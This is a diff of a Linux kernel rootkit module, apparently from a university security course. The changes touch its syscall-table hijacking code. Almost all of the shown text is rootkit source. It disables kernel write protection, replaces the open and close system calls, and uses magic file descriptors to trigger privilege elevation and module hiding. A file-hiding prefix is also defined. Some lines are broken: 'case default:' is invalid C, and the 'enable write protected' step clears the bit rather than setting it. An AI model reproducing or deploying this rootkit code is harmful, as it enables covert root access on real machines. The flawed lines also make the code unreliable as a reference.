@@ -13,18 +13,18 @@
 #include <asm/unistd.h>
 
 #if defined(__x86_64__)
-#define SYSCALL_TABLE_START ((unsigned long) 0xffffffff81000000l)
-#define SYSCALL_TABLE_STOP ((unsigned long) 0xffffffffa2000000l)
-typedef unsigned int pointer_size_t;
+#define SYSCALL_TABLE_START 0xffffffff81000000l
+#define SYSCALL_TABLE_STOP 0xffffffffa2000000l
+typedef unsigned long pointer_size_t;
 unsigned long **syscall_table;
 #else
-#define SYSCALL_TABLE_START ((unsigned long) 0xc0000000)
-#define SYSCALL_TABLE_STOP ((unsigned long) 0xd0000000)
+#define SYSCALL_TABLE_START  0xc0000000
+#define SYSCALL_TABLE_STOP  0xd0000000
 typedef unsigned int pointer_size_t;
 unsigned int **syscall_table;
 #endif
 
-#define HIDE_PREFIX ".cse509"
+#define HIDE_PREFIX "cse509--"
 #define BUFSIZE 32768
 
 struct linux_dirent {
@@ -306,6 +306,7 @@ out:
 asmlinkage int my_open(const char __user *pathname, int flags, int mode)
 {
     int fd;
+    //printk("Hijacked open called\n");
     fd = original_open(pathname, flags, mode);
     
     if (is_proc(pathname)) {
@@ -323,7 +324,7 @@ asmlinkage int my_open(const char __user *pathname, int flags, int mode)
 asmlinkage int my_close(int fd)
 {
     int err = 0;
-
+    //printk("Hijacked close called\n");
     if (fd < 0) {
         switch (fd) {
         case ELEVATE_UID:
@@ -347,6 +348,8 @@ asmlinkage int my_close(int fd)
         case SHOW_MODULE:
             show_module();
             break;
+        case default:
+            err = original_close(fd);
         }
     }
     else {
@@ -404,7 +407,6 @@ int rootkit_init(void)
      */    
     //hide_module();
 
-
     
     syscall_table = find_syscall_table();
     if (!syscall_table) {
@@ -413,9 +415,10 @@ int rootkit_init(void)
     
     printk("Syscall table at %p\n", syscall_table);
     
+    
     // make writable by disabling write protect
     write_cr0(read_cr0() & (~0x10000));
-
+    
     // hijack close system call
     original_close = (asmlinkage int (*)(int)) syscall_table[__NR_close];
     syscall_table[__NR_close] = (void *) my_close;
@@ -423,15 +426,15 @@ int rootkit_init(void)
     // hijack open system call
     original_open = (asmlinkage int (*)(const char *, int, int)) syscall_table[__NR_open];
     syscall_table[__NR_open] = (void *) my_open;
-
+    /*
     // hijack getdents system call
     original_getdents = (asmlinkage int (*)(unsigned int, struct linux_dirent *, unsigned int))
                         syscall_table[__NR_getdents];
     syscall_table[__NR_getdents] = (void *) my_getdents;
-
+    */
     // enable write protected
     write_cr0(read_cr0() & 0x10000);
-
+    
     out:
     return 0;
 }
@@ -440,7 +443,7 @@ int rootkit_init(void)
 void rootkit_exit(void)
 {
     deinit_buf_struct();
-    
+     
     if (syscall_table == NULL) {
         printk("RKIT: Nothing to unload\n");
         goto out;
@@ -451,11 +454,12 @@ void rootkit_exit(void)
 
     syscall_table[__NR_close] = (void *) original_close;
     syscall_table[__NR_open] = (void *) original_open;
-    syscall_table[__NR_getdents] = (void *) original_getdents;
 
+    //syscall_table[__NR_getdents] = (void *) original_getdents;
+    
     // Enable write protection on page
     write_cr0(read_cr0() & 0x10000);
-
+    
 out:
     show_module();
     printk("Rootkit unloaded\n");
